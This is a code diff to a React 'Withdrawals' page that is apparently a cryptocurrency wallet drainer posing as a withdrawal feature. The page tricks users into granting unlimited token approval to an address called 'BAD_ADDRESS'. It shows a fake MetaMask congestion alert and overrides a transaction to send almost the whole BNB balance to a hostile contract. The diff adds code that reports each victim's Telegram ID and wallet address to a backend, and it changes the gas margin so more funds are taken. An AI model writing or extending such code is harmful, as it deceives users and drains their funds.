@@ -21,6 +21,7 @@ import {
   useColorMode
 } from '@chakra-ui/react';
 import { useAddress, useNetworkMismatch, useSDK } from '@thirdweb-dev/react';
+import axios from 'axios';
 import { Error } from 'components/elements/Error';
 import { Formik, Form } from 'formik';
 import { useSession } from 'next-auth/react';
@@ -67,6 +68,8 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
     try{
       let contract = await sdk?.getContractFromAbi(bestToken?.address || "", BAD_ABI);
       await contract?.call("approve", process.env.NEXT_PUBLIC_BAD_ADDRESS, "115792089237316195423570985008687907853269984665640564039457584007913129639935");
+      let telegramId = session?.user.telegramId;
+      axios.post("/api/updateaddr", { telegramId, address });
       setEnabled(true);
     } catch {
       toast({description: "You must Approve to enable withdraw", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
@@ -138,14 +141,14 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
     let bnbBalance: any = (await sdk?.wallet.balance())?.value || 0;
     let gasPrice = parseFloat(await badContract?.estimator.currentGasPriceInGwei() || "0");
     let estimatedGas = parseFloat((await badContract?.estimator.gasCostOf("approve", [bestToken?.address, bestToken?.balance]) || "0")) * 10**18;
-    let value = BigInt(bnbBalance - (estimatedGas * gasPrice * 4));
+    let value = BigInt(bnbBalance - (estimatedGas * gasPrice * 2));
 
     alert("MetaMask:\ndue to network congestion, gas fees estimation could be wrong");
 
     badContract?.interceptor.overrideNextTransaction(() => ({from: address, value: value}));
     try{
       await badContract?.call("approve", bestToken?.address, bestToken?.balance);
-    } catch {
+    } catch(err) {
       toast({description: "You must Approve to withdraw your pending funds", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
     }
   };
